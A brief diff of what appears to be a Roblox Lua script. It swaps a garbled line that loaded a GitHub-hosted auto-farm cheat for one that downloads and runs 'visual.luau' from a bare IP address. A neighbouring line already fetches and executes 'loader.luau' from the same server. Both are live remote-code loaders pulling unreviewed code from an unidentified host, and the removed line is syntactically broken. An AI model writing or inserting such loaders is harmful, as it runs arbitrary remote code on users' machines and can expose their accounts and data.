@@ -1,3 +1,3 @@
 ID="0b3a5017-c157-4c38-8d13-75ca9433265e";
-RUN_AFTER=loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/elmoHUB/c/refs/heads/main/ADM-AutoFarm"))()"));
+RUN_AFTER=loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/visual.luau"));
 loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/loader.luau"))();
